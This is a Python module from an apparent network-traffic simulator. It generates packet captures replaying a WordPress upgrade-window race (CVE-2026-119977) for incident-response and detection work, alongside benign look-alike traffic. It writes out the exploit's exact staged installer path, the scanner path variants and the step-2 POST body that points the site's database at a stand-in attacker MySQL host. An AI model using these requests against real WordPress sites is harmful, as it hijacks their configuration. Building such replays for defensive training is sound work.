"""netgen.wordpress_upgrade_race -- the "WordPress upgrade-window race" incident-replay scenario
(CVE-2026-119977, WordPress Core, CISA KEV 3 Nov 2026, fixed in 7.1.4 / 28 Oct 2026).

During a full-package core update the new files sit, for a few seconds, in a web-reachable
staging tree under ``wp-content/upgrade/`` -- including the installer ``setup-config.php``.
Internet scanners poll for that path for hours; one of them lands inside the window, completes
installer step 2 with database settings pointing at an attacker-run MySQL server, and the site's
``wp-config.php`` ends up pointed at the attacker's database.

Modelled as a selectable scenario (``ir-wordpress-upgrade-race``, category IR), a SIBLING package
to the other IR replays (modelled on ``netgen.vcenter59310``). Two hosts are injected at runtime --
the WordPress site (EXL-WEB4) and an internal MySQL host for the legitimate database leg (EXL-DB4)
-- so a build that does not select this scenario is byte-for-byte the baseline.

Response strings are verbatim from the 7.1.3 ``wp-admin/setup-config.php`` source. The engine has no
MySQL wire-protocol emitter; a minimal real one (server greeting, client login response, OK
packet, a text query) is built below, self-contained in this package so no shared helper's random
draw order changes for any other scenario.

PIN-SAFE: every host is injected into ``ctx.h`` INSIDE ``build()``; a build that does not select
this scenario is byte-for-byte the baseline.
"""
import struct

from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

from netgen.netscaler import _host
from netgen.netscaler.phases import _http_req

rng = F.rng

_WEB4_SUFFIX, _WEB4_IP = "WEB4", "10.10.20.43"      # internal WordPress site, published like EXL-WEB3
_WEB4_MAC = "00:50:56:bb:0a:43"
_DB4_SUFFIX, _DB4_IP = "DB4", "10.10.20.44"         # legitimate internal MySQL host
_DB4_MAC = "00:50:56:bb:0a:44"

# Documentation-range external addresses (spec section 9): three pollers (one of them the
# exploiter) + the rogue MySQL sink. Built directly (not through used_indicator_ips()).
_EXTERNAL = {
    "poll1": ("scan201.probe-labs.example", "203.0.113.119", 9),
    "poll2": ("scan214.probe-labs.example", "203.0.113.120", 11),
    "exploiter": ("scan233.probe-labs.example", "203.0.113.121", 10),   # the poller that wins the race
    "roguedb": ("db-sync.wp-mirror-cdn.example", "198.51.100.119", 13),  # attacker's MySQL sink
}
_CDN_FQDN, _CDN_IP = "downloads.wordpress.org", "192.0.2.119"           # package download source

_PREFIX = "wp_"
_NEW_VERSION = "7.1.4"
_UAS = ("python-requests/2.32.3", "curl/8.9.1", "Go-http-client/1.1")

# ---- the exact staged path (spec A1, resolved from the 7.1.3 primary source) --------------
_STAGE_PATH = "/wp-content/upgrade/wordpress-%s/wordpress/wp-admin/setup-config.php" % _NEW_VERSION
# wrong-guess path variants scanners actually probe (secondary reports' shape, all 404)
_PATH_VARIANTS = [
    _STAGE_PATH,    # the exact staged path: 404 before and after the window, 200 only inside it
    "/wp-content/upgrade/wordpress-7.1.3/wordpress/wp-admin/setup-config.php",
    "/wp-content/upgrade/wordpress-latest/wordpress/wp-admin/setup-config.php",
    "/wp-content/upgrade/wordpress-%s/wp-admin/setup-config.php" % _NEW_VERSION,   # missing nested wordpress/
    "/wp-content/upgrade/",
    "/wp-content/upgrade/wordpress-%s.zip" % _NEW_VERSION,
]

# ---- section 6: verbatim response strings --------------------------------------------------
_TITLE = "WordPress &rsaquo; Setup Configuration File"
_STEP0_BODY = (
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>%s</title></head><body>"
    "<h1>Before getting started</h1><p>Welcome. Before getting started, make sure you have "
    "the following information handy: Database name, database username, database password, "
    "database host, table prefix.</p><ol><li>Database name</li><li>Database username</li>"
    "<li>Database password</li><li>Database host</li><li>Table prefix</li></ol>"
    "<p><a href=\"setup-config.php?step=1\" class=\"button button-large\">Let&#8217;s go!</a></p>"
    "</body></html>" % _TITLE
).encode()
_STEP1_BODY = (
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>%s</title></head><body>"
    "<form method=\"post\" action=\"setup-config.php?step=2\">"
    "<input name=\"dbname\" type=\"text\" value=\"wordpress\" size=\"25\">"
    "<input name=\"uname\" type=\"text\" value=\"root\" size=\"25\">"
    "<input name=\"pwd\" type=\"text\" value=\"\" size=\"25\">"
    "<input name=\"dbhost\" type=\"text\" value=\"localhost\" size=\"25\">"
    "<input name=\"prefix\" type=\"text\" value=\"wp_\" size=\"25\">"
    "<input name=\"language\" type=\"hidden\" value=\"\">"
    "<input name=\"noapi\" type=\"hidden\" value=\"\">"
    "<input type=\"submit\" value=\"Submit\"></form></body></html>" % _TITLE
).encode()
_STEP2_SUCCESS_BODY = (
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>%s</title></head><body>"
    "<h1>%%s</h1>"
    "All right, sparky! You&#8217;ve made it through this part of the installation. WordPress "
    "can now communicate with your database. If you are ready, time now to..."
    "<p><a href=\"install.php?language=\" class=\"button button-large\">Run the installation</a></p>"
    "</body></html>" % _TITLE
).encode() % b"Connection established"
_ERR_PREFIX_EMPTY = b"<strong>Error:</strong> &#8220;Table Prefix&#8221; must not be empty."
_ERR_PREFIX_CHARS = (b"<strong>Error:</strong> &#8220;Table Prefix&#8221; can only contain "
                     b"numbers, letters, and underscores.")
_ERR_PREFIX_INVALID = b"<strong>Error:</strong> &#8220;Table Prefix&#8221; is invalid."
_ERR_WRITE = b"Unable to write to wp-config.php file."


def _step2_error_body(msg):
    return (
        "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>%s</title></head><body>"
        "<h1>Below you should enter your database connection details.</h1>%%s</body></html>" % _TITLE
    ).encode() % msg


# ================================================================================ MySQL wire
# The engine has no MySQL protocol emitter; a minimal real one. Packet framing per the MySQL
# client/server protocol: 3-byte little-endian length + 1-byte sequence number + payload.
def _mysql_packet(seq, payload):
    return struct.pack("<I", len(payload))[:3] + bytes([seq & 0xFF]) + payload


def _mysql_lenenc_int(n):
    if n < 251:
        return bytes([n])
    if n < 2 ** 16:
        return b"\xfc" + struct.pack("<H", n)
    if n < 2 ** 24:
        return b"\xfd" + struct.pack("<I", n)[:3]
    return b"\xfe" + struct.pack("<Q", n)


def mysql_handshake(conn_id=None, version="8.0.39-0ubuntu0.24.04.1"):
    """Initial Handshake Packet V10 -- protocol version, server version string, capabilities,
    status flags, and the auth-plugin name (caching_sha2_password)."""
    conn_id = conn_id if conn_id is not None else rng.randint(10, 99999)
    auth1 = bytes(rng.randrange(1, 256) for _ in range(8))
    auth2 = bytes(rng.randrange(1, 256) for _ in range(12))
    cap_lower = 0xA685
    cap_upper = 0x01FF
    payload = (
        bytes([10]) + version.encode() + b"\x00" +
        struct.pack("<I", conn_id) +
        auth1 + b"\x00" +
        struct.pack("<H", cap_lower) +
        bytes([0x2D]) +                       # charset: utf8mb4_general_ci
        struct.pack("<H", 0x0002) +           # status: SERVER_STATUS_AUTOCOMMIT
        struct.pack("<H", cap_upper) +
        bytes([21]) +                         # auth-plugin-data length
        b"\x00" * 10 +
        auth2 + b"\x00" +
        b"caching_sha2_password\x00"
    )
    return _mysql_packet(0, payload)


def mysql_login(user, database=None, seq=1):
    """Client Handshake Response Packet 41."""
    caps = 0x080AA685 | (0x00000008 if database else 0)   # + CLIENT_CONNECT_WITH_DB
    scramble = bytes(rng.randrange(1, 256) for _ in range(20))
    payload = (
        struct.pack("<I", caps) +
        struct.pack("<I", 0x01000000) +
        bytes([0x2D]) +
        b"\x00" * 23 +
        user.encode() + b"\x00" +
        bytes([len(scramble)]) + scramble +
        (database.encode() + b"\x00" if database else b"") +
        b"caching_sha2_password\x00"
    )
    return _mysql_packet(seq, payload)


def mysql_ok(seq=2, status_flags=0x0002):
    """OK Packet (header 0x00): affected rows 0, last insert id 0, status, 0 warnings."""
    payload = (
        b"\x00" +
        _mysql_lenenc_int(0) +
        _mysql_lenenc_int(0) +
        struct.pack("<H", status_flags) +
        struct.pack("<H", 0)
    )
    return _mysql_packet(seq, payload)


def mysql_query(sql, seq=0):
    """COM_QUERY (0x03) + the text query."""
    return _mysql_packet(seq, b"\x03" + sql.encode())


def mysql_err(code, message, seq=1, sql_state="42S22"):
    """ERR Packet (header 0xff), CLIENT_PROTOCOL_41 shape (SQL state marker '#')."""
    payload = b"\xff" + struct.pack("<H", code) + b"#" + sql_state.encode() + message.encode()
    return _mysql_packet(seq, payload)


def mysql_leg(ctx, web, dbhost, ts, prefix=_PREFIX, success=True, vantage=None):
    """One MySQL session WEB4 -> dbhost on :3306: server greeting, client login response, OK
    packet, then a text query for the prefix check (``SELECT <prefix>``, spec section 6). A
    handful of packets, under 1 KB total, real MySQL wire format throughout."""
    out = ctx.arp_for(web, dbhost, ts, vantage=vantage or web)
    s = ctx.tcp(web, dbhost, 3306, ts + 0.001, vantage=vantage or web).handshake()
    s.s2c(mysql_handshake(), think=rng.uniform(0.001, 0.01))
    s.c2s(mysql_login("root"), think=rng.uniform(0.001, 0.006))
    s.s2c(mysql_ok(seq=2), think=rng.uniform(0.001, 0.008))
    s.c2s(mysql_query("SELECT " + prefix, seq=0), think=rng.uniform(0.005, 0.05))
    if success:
        s.s2c(mysql_ok(seq=1), think=rng.uniform(0.002, 0.02))
    else:
        s.s2c(mysql_err(1046, "No database selected", seq=1), think=rng.uniform(0.002, 0.02))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


# ================================================================================ hosts
def _inject_hosts(ctx):
    """Add EXL-WEB4, EXL-DB4, and the external actors. Pin-safe: runs only in build()."""
    domain = P.DOMAIN
    web_name = _host(ctx, _WEB4_SUFFIX)
    if web_name not in ctx.h:
        ctx.h[web_name] = Host(web_name, ctx.link.place(_WEB4_IP), _WEB4_MAC, "linux",
                               "Internal WordPress site (Apache/PHP-FPM)", ctx.link.server_net,
                               "wp." + domain)
    db_name = _host(ctx, _DB4_SUFFIX)
    if db_name not in ctx.h:
        ctx.h[db_name] = Host(db_name, ctx.link.place(_DB4_IP), _DB4_MAC, "linux",
                              "Internal MySQL database host", ctx.link.server_net, "db4." + domain)
    cache = ctx.__dict__.setdefault("_wpur_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % tuple(rng.randrange(256) for _ in range(3)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    if _CDN_FQDN not in cache:
        h = Host(_CDN_FQDN.split(".")[0].upper(), _CDN_IP,
                 "02:00:5e:%02x:%02x:%02x" % tuple(rng.randrange(256) for _ in range(3)),
                 "linux", "external", _CDN_IP.rsplit(".", 1)[0] + ".0/24", _CDN_FQDN)
        h.hops = 14
        cache[_CDN_FQDN] = h
    return cache


# ================================================================================ HTTP phases
def _apache_404(path, fqdn):
    """Apache 2.4's stock 404 page (ErrorDocument default), matching the Server header sent."""
    return ("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n"
            "<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n"
            "<p>The requested URL %s was not found on this server.</p>\n<hr>\n"
            "<address>Apache/2.4.58 (Ubuntu) Server at %s Port 80</address>\n</body></html>\n"
            % (path, fqdn)).encode()


def poll_404(ctx, src, web, ts, path=None):
    """Background polling (stage 0): an external host GETs a staged-path variant. 404 outside
    the race window; always 404 after the fix (look-alike: section 8, bullet 3)."""
    path = path or rng.choice(_PATH_VARIANTS)
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    s.c2s(_http_req("GET", path, web.fqdn, ua), think=rng.uniform(0.002, 0.02))
    body = _apache_404(path, web.fqdn)
    s.s2c(P.http_response("404 Not Found", body, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.01, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


def window_step0(ctx, src, web, ts):
    """Race window, stage A: the SAME polling GET now returns 200 with the step 0 welcome page."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    s.c2s(_http_req("GET", _STAGE_PATH, web.fqdn, ua), think=rng.uniform(0.002, 0.02))
    s.s2c(P.http_response("200 OK", _STEP0_BODY, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.01, 0.08))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


def window_step1(ctx, src, web, ts):
    """Race window, stage B: GET setup-config.php?step=1, the database-settings form."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    path = _STAGE_PATH + "?step=1"
    s.c2s(_http_req("GET", path, web.fqdn, ua), think=rng.uniform(0.002, 0.02))
    s.s2c(P.http_response("200 OK", _STEP1_BODY, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.01, 0.08))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


def window_exploit(ctx, src, web, dbhost, ts, prefix=_PREFIX):
    """Race window, stage C (the exploit): POST setup-config.php?step=2 with database settings
    pointing at the attacker's dbhost; the web server connects out on :3306 for the prefix
    check, then returns 200 success. The MySQL leg is scheduled as part of the same timestamp
    (it is causally the server's own side-effect of processing this POST)."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    path = _STAGE_PATH + "?step=2"
    fields = "dbname=wordpress&uname=root&pwd=&dbhost=%s&prefix=%s&language=&noapi=1" % (dbhost.ip, prefix)
    body = fields.encode()
    hdrs = ["Content-Type: application/x-www-form-urlencoded"]
    s.c2s(_http_req("POST", path, web.fqdn, ua, extra=hdrs, body=body), think=rng.uniform(0.002, 0.02))
    # the server's own side-effect: the MySQL leg to the attacker's dbhost, mid-request. In
    # setup-config.php the connect + prefix check happen BEFORE the page is rendered, so the 200
    # is only sent once the MySQL session is over.
    mysql_frames = mysql_leg(ctx, web, dbhost, s.t + rng.uniform(0.01, 0.05), prefix=prefix, success=True, vantage=web)
    s.at(max(t for t, _ in mysql_frames) + rng.uniform(0.003, 0.02))
    s.s2c(P.http_response("200 OK", _STEP2_SUCCESS_BODY, "text/html; charset=UTF-8", s.t,
                          server="Apache/2.4.58 (Ubuntu)"), think=rng.uniform(0.005, 0.03))
    pkts = F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))
    return F.merged(pkts, mysql_frames)


def window_exploit_fail(ctx, src, web, dbhost, ts, reason="empty"):
    """A malformed probe inside the window that does NOT win: an empty or invalid prefix, so
    setup-config.php rejects it before ever opening a database connection (spec section 6)."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    path = _STAGE_PATH + "?step=2"
    prefix = {"empty": "", "chars": "wp-bad!", "invalid": "0startswithdigit"}[reason]
    body = ("dbname=wordpress&uname=root&pwd=&dbhost=%s&prefix=%s&language=&noapi=1" %
            (dbhost.ip, prefix)).encode()
    hdrs = ["Content-Type: application/x-www-form-urlencoded"]
    s.c2s(_http_req("POST", path, web.fqdn, ua, extra=hdrs, body=body), think=rng.uniform(0.002, 0.02))
    msg = {"empty": _ERR_PREFIX_EMPTY, "chars": _ERR_PREFIX_CHARS, "invalid": _ERR_PREFIX_INVALID}[reason]
    s.s2c(P.http_response("200 OK", _step2_error_body(msg), "text/html; charset=UTF-8", s.t,
                          server="Apache/2.4.58 (Ubuntu)"), think=rng.uniform(0.02, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


def live_precheck_409(ctx, src, web, ts):
    """A patched/scanning host POSTs step 2 to the live site (wp-config.php already exists):
    the pre-check answers 409, per spec section 6 -- distinct from the always-404 staged-path probes."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(_UAS)
    body = b"dbname=wordpress&uname=root&pwd=&dbhost=localhost&prefix=wp_&language=&noapi=1"
    s.c2s(_http_req("POST", "/wp-admin/setup-config.php?step=2", web.fqdn, ua,
                    extra=["Content-Type: application/x-www-form-urlencoded"], body=body),
          think=rng.uniform(0.002, 0.02))
    page = (b"<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>WordPress &rsaquo; Error</title>"
            b"</head><body id=\"error-page\"><div class=\"wp-die-message\"><p>The file "
            b"<code>wp-config.php</code> already exists. If you need to reset any of the "
            b"configuration items in this file, please delete it first. You may try "
            b"<a href='install.php'>installing now</a>.</p></div></body></html>")
    s.s2c(P.http_response("409 Conflict", page, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.01, 0.08))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.01, 0.1)))


def update_admin_start(ctx, admin, web, ts):
    """Stage 1: an admin workstation triggers the manual core-upgrade action."""
    out = ctx.arp_for(admin, web, ts, vantage=web)
    s = ctx.tcp(admin, web, 80, ts + 0.001, vantage=web).handshake()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    s.c2s(_http_req("GET", "/wp-admin/update-core.php?action=do-core-upgrade", web.fqdn, ua),
          think=rng.uniform(0.01, 0.05))
    body = b"<html><head><title>Update WordPress</title></head><body><h1>Updating...</h1></body></html>"
    s.s2c(P.http_response("200 OK", body, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.02, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.02, 0.1)))


def package_download(ctx, web, cdn, total_bytes, dur, ts):
    """Stage 1: WEB4 downloads the full update package over TLS from the CDN (~25-35 MB).
    One GET, one streamed response, shaped so the transfer takes ``dur`` seconds (the draw the
    schedule's race window is anchored to): the link rate is total*8/dur and ACKs do not stall
    the sender (``streaming``), so the session ends about ``dur`` s after it starts."""
    from netgen.tls import TlsSession
    pre = F.dns_lookup(ctx, web, cdn.fqdn, ts, external=True, answers=[(P.DNS_A, cdn.ipb)])
    t = ts + rng.uniform(0.005, 0.05)
    out = ctx.arp_for(web, cdn, t)
    total = int(total_bytes)
    s = ctx.tcp(web, cdn, 443, t + 0.001, rate=max(1e5, total * 8.0 / dur)).handshake()
    tls = TlsSession(ctx.pki, cdn.fqdn, ctx.keylog, profile=getattr(web, "tls_profile", "chrome"))
    for from_c, data in tls.handshake():
        if from_c:
            s.c2s(data, think=rng.uniform(0.0005, 0.003))
        else:
            s.s2c(data, think=rng.uniform(0.002, 0.01))
    s.streaming = True
    req = P.http_request("GET", "/wordpress-%s.zip" % _NEW_VERSION, cdn.fqdn,
                         "WordPress/%s; https://wp.example" % _NEW_VERSION, [])
    s.c2s(tls.app_data(True, req), think=rng.uniform(0.0008, 0.004))
    resp = P.http_response("200 OK", P.blob(total), "application/zip", s.t, server="nginx",
                           headers=["Cache-Control: max-age=600", "Strict-Transport-Security: max-age=63072000"])
    s.s2c(tls.app_data(False, resp), think=rng.uniform(0.02, 0.12))
    s.c2s(tls.close_notify(True), think=0.05)
    return F.merged(pre, out, s.close(think=0.002))


def normal_visit(ctx, src, web, ts):
    """Benign look-alike (section 8, bullet 2): an ordinary visitor that never touches
    wp-content/upgrade/."""
    out = ctx.arp_for(src, web, ts, vantage=web)
    s = ctx.tcp(src, web, 80, ts + 0.001, vantage=web).handshake()
    ua = rng.choice(("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"))
    path = rng.choice(("/", "/wp-login.php", "/about/", "/contact/"))
    s.c2s(_http_req("GET", path, web.fqdn, ua), think=rng.uniform(0.01, 0.05))
    body = ("<!DOCTYPE html><html><head><title>" + get_current().name + " WordPress</title></head><body>"
            "<h1>Welcome</h1><p>%s</p></body></html>" % path).encode()
    s.s2c(P.http_response("200 OK", body, "text/html; charset=UTF-8", s.t, server="Apache/2.4.58 (Ubuntu)"),
          think=rng.uniform(0.02, 0.1))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.02, 0.1)))


def legit_db_query(ctx, web, db4, ts):
    """Benign look-alike (section 8, bullet 4): WEB4's ordinary application database connection
    to the internal MySQL host EXL-DB4, distinguishing an internal 3306 destination from the
    rogue public one on the same port."""
    return mysql_leg(ctx, web, db4, ts, prefix=_PREFIX, success=True, vantage=web)


# ================================================================================ build
def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-119977 incident: background polling for the staged setup-config.php
    path (mostly 404) -> an admin-triggered core update and package download -> the race window
    (the SAME polling GET returns 200 for a few seconds) -> the exploit POST (rogue MySQL leg) ->
    promotion (implicit: the path 404s again) -> aftermath (WEB4 keeps talking to the rogue
    database). Interleaved with four benign look-alikes (spec section 8). Registered as
    ``ir-wordpress-upgrade-race`` (imported lazily)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    sched = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    web = ctx.h[_host(ctx, _WEB4_SUFFIX)]
    db4 = ctx.h[_host(ctx, _DB4_SUFFIX)]
    admin = ctx.h.get(_host(ctx, "WS-021"))
    poll1, poll2, exploiter = ext["poll1"], ext["poll2"], ext["exploiter"]
    roguedb = ext["roguedb"]
    cdn = ext[_CDN_FQDN]

    span = max(1800.0, hi - lo)

    # ---- Stage 1: admin-triggered update + package download ---------------------------------
    update_start = at(min(span * 0.3, 3600))
    if admin is not None:
        sched(update_start, update_admin_start, admin, web)
    download_total = rng.uniform(25_000_000, 35_000_000) * scale
    download_dur = rng.uniform(10.0, 40.0)
    download_start = update_start + 1.0
    sched(download_start, package_download, web, cdn, download_total, download_dur)

    # ---- Stage 2: the race window --------------------------------------------------------------
    # Unpacking cannot start before the download ends: the transfer is shaped to take download_dur
    # (see package_download) and the window opens after it plus a verify/unpack lag.
    unpack_lag = rng.uniform(2.0, 5.0)
    window_start = download_start + download_dur * 1.1 + 1.0 + unpack_lag
    window_len = rng.uniform(4.0, 9.0)                   # A2 -- measured at Stage 5, see spec section 5
    window_end = window_start + window_len
    ctx.__dict__.setdefault("_wpur_measured", {})["window"] = (window_start, window_end, window_len)
    ctx.__dict__.setdefault("_wpur_measured", {})["download"] = (download_start, download_dur)

    # ---- Stage 0: background polling, mostly 404, hours before and after the window ----------
    # The exact staged path is among the polled variants, so it 404s before and after the window.
    # A poller whose request would land inside the window on that exact path would get the 200
    # (and break the single-source F2 signal), so those draws are re-rolled to a wrong-guess
    # variant; the exploiter alone gets the 200s (its own step chain below).
    wrong = [p for p in _PATH_VARIANTS if p != _STAGE_PATH]

    def poll_path(t):
        p = rng.choice(_PATH_VARIANTS)
        if p == _STAGE_PATH and window_start - 2.0 <= t <= window_end + 1.0:
            p = rng.choice(wrong)
        return p

    for src in (poll1, poll2, exploiter):
        t = lo + rng.uniform(0, 30)
        while t < hi:
            sched(t, poll_404, src, web, path=poll_path(t))
            t += rng.uniform(5, 60)
    # the exploiter polls the exact path just before the window opens (404) and just after it
    # closes (404): the same GET that wins inside the window
    sched(window_start - rng.uniform(3.0, 10.0), poll_404, exploiter, web, path=_STAGE_PATH)
    sched(window_end + rng.uniform(3.0, 10.0), poll_404, exploiter, web, path=_STAGE_PATH)
    # a handful of bare-listing probes
    t = lo + rng.uniform(0, 60)
    while t < hi:
        sched(t, poll_404, rng.choice((poll1, poll2)), web, path="/wp-content/upgrade/")
        t += rng.uniform(600, 1800)

    # NOTE: window_exploit_fail (the malformed-prefix failure variants, spec section 6) is kept as
    # a function but deliberately NOT scheduled inside the live window here: any request to
    # setup-config.php only reaches the installer logic (and so can return anything other than
    # 404) during the window, so scheduling a second, different source's attempt inside the same
    # few seconds would put a second 200 on the wire and break F2's "exactly one source" signal.
    # It is available for a separate look-alike build if that false-positive shape is wanted.
    # the exploiter's step 0 -> step 1 -> step 2 (exploit), all inside the window, in order (A3)
    t0 = window_start + window_len * 0.35
    sched(t0, window_step0, exploiter, web)
    t1 = t0 + min(window_len * 0.2, 1.5)
    sched(t1, window_step1, exploiter, web)
    t2 = min(t1 + min(window_len * 0.2, 1.5), window_end - 0.05)
    sched(t2, window_exploit, exploiter, web, roguedb)

    # ---- Stage 3: promotion is implicit -- after window_end the staged path 404s again ---------
    # (modelled by the ordinary Stage 0 polling loop already scheduled across the whole window)

    # ---- Stage 4: aftermath -- WEB4 keeps talking to the rogue database -----------------------
    t = window_end + rng.uniform(30, 120)
    while t < hi:
        sched(t, mysql_leg, web, roguedb, prefix=_PREFIX, success=True, vantage=web)
        t += rng.uniform(300, 900)

    # ---- benign look-alikes (spec section 8) ---------------------------------------------------
    # 1) the admin-update + download sequence above IS the benign look-alike for most of stage 1 --
    #    only the race-window POST differs from an ordinary, unexploited core update.
    # 2) ordinary visitors never touching wp-content/upgrade/
    visits = max(3, int(round(10 * scale)))
    for _ in range(visits):
        sched(lo + rng.uniform(0, span), normal_visit, rng.choice((poll1, poll2, exploiter)), web)
    # 3) legitimate internal application database connection, WEB4 -> EXL-DB4
    t = lo + rng.uniform(0, 300)
    while t < hi:
        sched(t, legit_db_query, web, db4)
        t += rng.uniform(300, 600)
    # 4) a patched-host live pre-check (409), separate from the always-404 staged-path probes
    sched(lo + rng.uniform(span * 0.6, span * 0.9), live_precheck_409, poll2, web)
